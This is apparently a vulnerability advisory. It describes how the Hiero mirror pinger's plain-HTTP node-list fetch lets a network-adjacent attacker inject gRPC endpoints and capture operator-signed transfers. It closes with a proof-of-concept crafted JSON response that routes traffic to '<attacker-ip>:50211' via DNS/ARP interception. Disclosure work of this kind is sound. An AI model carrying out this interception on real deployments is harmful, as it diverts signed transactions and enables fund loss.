### Title
Unauthenticated HTTP Node-List Fetch Enables MitM Injection of Attacker-Controlled gRPC Endpoints, Routing Operator-Signed Transactions to Attacker Infrastructure

### Summary
When `HIERO_MIRROR_PINGER_NETWORK=other`, the pinger fetches its consensus-node list over a plain, unauthenticated HTTP connection to `cfg.mirrorRest` with no TLS enforcement, no response-integrity check, and no allowlist validation of returned endpoints. A network-adjacent attacker who can intercept or spoof that HTTP response can substitute attacker-controlled gRPC addresses, causing every subsequent operator-signed `CryptoTransfer` transaction to be delivered to attacker infrastructure rather than legitimate Hedera consensus nodes.

### Finding Description

**Exact code path:**

`pinger/mirror_node_client.go`, `buildNetworkFromMirrorNodes()`, lines 36–72, and `fetchMirrorNodeNetwork()`, lines 74–131.

1. **No HTTPS enforcement / no TLS config** — line 46 constructs a bare `&http.Client{Timeout: cfg.mirrorNodeClientTimeout}` with no custom `Transport`, no certificate pinning, and no scheme check. The documented default value for `HIERO_MIRROR_PINGER_REST` is `http://mirror-rest:5551` (plain HTTP). Nothing in `loadConfig()` (`config.go` lines 33–138) rejects an `http://` scheme or requires `https://`.

2. **No response integrity verification** — `fetchMirrorNodeNetwork()` (lines 95–98) decodes the raw HTTP response body directly into `nodesEnvelope` with `json.NewDecoder(resp.Body).Decode(&payload)`. There is no HMAC, no signature, no expected-node-count check, and no cross-reference against a known-good list.

3. **Attacker-supplied endpoints used verbatim** — lines 113–124 iterate `n.ServiceEndpoints`, accept any non-empty `DomainName` or `IPAddressV4` with any non-zero `Port`, and insert `net.JoinHostPort(host, port)` directly into the returned `network` map. No IP allowlist, no RFC-1918 block, no domain suffix check.

4. **Poisoned map fed to the SDK client** — `sdk_client.go` line 22 passes the map straight to `hiero.ClientForNetwork(netmap)`, and line 45 calls `client.SetOperator(opID, opKey)`, binding the operator's private key to a client whose node list is entirely attacker-controlled.

5. **Signed transactions dispatched to attacker gRPC** — `transfer.go` lines 29–33 build and execute a `CryptoTransfer` via `cryptoTransfer.Execute(client)`. The SDK signs the transaction with the operator key and sends it over gRPC to whichever endpoints are in the network map — now the attacker's server.

**Root cause:** The code assumes the mirror-node REST endpoint is trusted and reachable only over a secure channel. That assumption is not enforced anywhere in the code.

**Why existing checks are insufficient:**
- The only validation in `fetchMirrorNodeNetwork` is HTTP status code (lines 90–93), non-empty `NodeAccountID` (line 103), and parseable `AccountIDFromString` (lines 107–110). None of these touch the gRPC endpoint values.
- The `network == "other"` branch in `sdk_client.go` (lines 17–22) has no fallback or sanity check on the returned map.

### Impact Explanation

An attacker who controls the returned `nodesEnvelope` receives every operator-signed `CryptoTransfer` transaction. Because the transactions are fully signed and valid on the Hedera network, the attacker can:

- **Relay them to the real Hedera network**, causing the operator to lose funds (tinybar transfers execute as intended, but routed through the attacker).
- **Selectively drop or delay transactions**, causing silent pinger failures and defeating the liveness-monitoring purpose of the service.
- **Harvest transaction metadata** (operator account ID, destination, amount, transaction ID, timestamp) for reconnaissance or replay within the transaction validity window.

Severity: **High**. The operator's private key signs transactions that are delivered to infrastructure the operator never authorized, directly violating the "no transaction without owner approval" invariant.

### Likelihood Explanation

Preconditions are realistic in a typical Kubernetes or Docker Compose deployment:

- `HIERO_MIRROR_PINGER_NETWORK=other` is the only mode that uses this code path, but it is the mode required for any private/custom network — a common production scenario.
- The documented example URL (`http://mirror-rest:5551`) is plain HTTP, making in-cluster ARP/DNS poisoning or a compromised sidecar sufficient to intercept traffic.
- No special privileges are required on the pinger host; the attacker only needs a network-adjacent position (same pod network, same VLAN, or a compromised DNS resolver).
- The attack is repeatable on every startup of the pinger (the node list is fetched once at init time, `sdk_client.go` line 18).

### Recommendation

1. **Enforce HTTPS**: Reject `cfg.mirrorRest` values that do not begin with `https://` in `loadConfig()`, or configure the `http.Client` with a `Transport` that sets `TLSClientConfig` and disallows plain HTTP redirects.
2. **Pin or validate TLS certificates**: Use a custom `tls.Config` with a pinned CA or certificate fingerprint for the mirror-node endpoint.
3. **Validate returned endpoints against an allowlist**: After parsing `nodesEnvelope`, cross-check returned IP addresses or domain names against a configurable allowlist before populating the network map.
4. **Reject RFC-1918 / loopback addresses** unless explicitly permitted, to prevent SSRF-style endpoint injection.
5. **Integrity-check the response**: If the mirror node supports it, verify a response signature or at minimum compare the returned node account IDs against the expected set for the configured network.

```
# 1. Deploy pinger with:
#    HIERO_MIRROR_PINGER_NETWORK=other
#    HIERO_MIRROR_PINGER_REST=http://<mirror-rest-host>:5551

# 2. Attacker on the same network intercepts DNS or ARP for <mirror-rest-host>
#    and serves a crafted HTTP response:

HTTP/1.1 200 OK
Content-Type: application/json

{
  "nodes": [
    {
      "node_account_id": "0.0.3",
      "service_endpoints": [
        { "ip_address_v4": "<attacker-ip>", "port": 50211 }
      ]
    }
  ],
  "links": { "next": null }
}

# 3. pinger/mirror_node_client.go:fetchMirrorNodeNetwork() decodes this response
#    and returns {"<attacker-ip>:50211": AccountID{0,0,3}} as the network map.

# 4. sdk_client.go:newClient() calls hiero.ClientForNetwork(netmap) and
#    client.SetOperator(opID, opKey) — operator key now bound to attacker node.

# 5. On every ticker tick, transfer.go:submitWithRetry() builds and executes
#    a signed CryptoTransfer. The SDK sends the signed protobuf over gRPC to
#    <attacker-ip>:50211.

# 6. Attacker's gRPC server receives the fully signed transaction and can
#    forward it to the real Hedera network, causing fund loss, or drop it,
#    causing silent monitoring failure.
```
